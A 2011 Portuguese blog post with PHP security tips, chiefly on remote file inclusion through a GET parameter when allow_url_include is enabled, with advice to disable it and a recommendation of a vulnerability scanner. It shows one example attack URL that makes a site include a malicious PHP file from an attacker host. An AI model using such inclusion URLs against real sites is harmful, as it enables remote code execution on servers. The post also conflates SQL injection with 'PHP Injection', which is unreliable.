---
layout: post
title: Algumas dicas de segurança no PHP
date: '2011-11-22T09:35:00.000-08:00'
description: Algumas dicas de segurança no PHP
main-class: 'misc'
tags:
- Web Hacker
- PHP
image: http://2.bp.blogspot.com/-On3qcOCfgN8/TsvcEa2RPXI/AAAAAAAAAQg/OjkR8vGrhdY/s72-c/Hacker_Wallpaper_1280x1024_by_Pengo1.jpg
twitter_text: Algumas dicas de segurança no PHP
introduction: Algumas dicas de segurança no PHP
---
![Blog Linux](http://2.bp.blogspot.com/-On3qcOCfgN8/TsvcEa2RPXI/AAAAAAAAAQg/OjkR8vGrhdY/s320/Hacker_Wallpaper_1280x1024_by_Pengo1.jpg "Blog Linux")
Se tem duas coisas que eu adoro em Tecnologia e Internet são: Velocidade e Segurança(principalmente).Vamos inciar projetos de segurança em códigos, sistemas, softwares...pois isso é mais do que importante.
No PHP um dos ataques que mais acontecem é via inclusão de url através do include via método GET, exemplo:
se vc tem um site:
{% highlight bash %}
http://www.seusite.com.br
{% endhighlight %} e no php.ini está habilitada a linha:{% highlight bash %}
allow_url_include=On
{% endhighlight %} , alguém pode chegar no seu site e fazer assim:{% highlight bash %}
http://www.seusite.com.br/?pagina=http://sitecracker.net/malicioso.php
{% endhighlight %} , dessa forma, vai saber o que tem dentro do arquivo malicioso.php e o que isso pode ser feito?Existem algumas formas de você se proteger a esse tipo de ataque(inclusive informar quais arquivos são permitidos pra inclusão no próprio PHP), um deles é desabilitar o allow_url_include do php.ini , ficando assim:{% highlight bash %}
allow_url_include=Off
{% endhighlight %} , para encontrar o php.ini no debian e derivados, o caminho é, como o usuário root:
{% highlight bash %}
# su
# gedit /etc/php5/apache2/php.ini
{% endhighlight %}
dê um Ctrl+F e procure allow_url_include , caso você não tenha acesso ao php.ini , tente setá-lo pelo código php com a função ini_set():
{% highlight bash %}
<?php
ini_set('allow_url_include', 'Off');
?>
{% endhighlight %}
mas teste antes pra verificar se realmente funcionou.
Outro tipo de ataque que todo mundo já deve conhecer é o SQL INjection, que na verdade é o PHP Injection, nunca consegui atacar por testes com esse método, mas se você deseja saber mais sobre esse tipo de ataque Clique Aqui - WikiPedia ou Aqui - Manual do PHP
Vou postar em próximas publicações mais a respeito deste assunto, porém caso você deseje instalar um utilitário para verificar as vulnerabilidades do seu código, eu recomendo o:
PHP Vulnerability Hunter
PHP Vulnerabiliry Hunter é uma avançada e automatizada ferramenta whitebox desenvolvida para testes de fuzz. Essa aplicação detectou quase todas as vulnerabilidades de aplicações web listadas nas principais páginas de alerta. PHP Vulnerability Hunter tem a capacidade de desencadear uma ampla gama de falhas exploráveis, ​​em aplicações Web PHP. A configuração mínima é necessária para iniciar um processo de scanning; PHP Vulnerability Hunter não precisa sequer de um usuário especificado para um starting URI .
Clique aqui para fazer o download do PHP Vulnerability Hunter
Valeu, até a próxima!
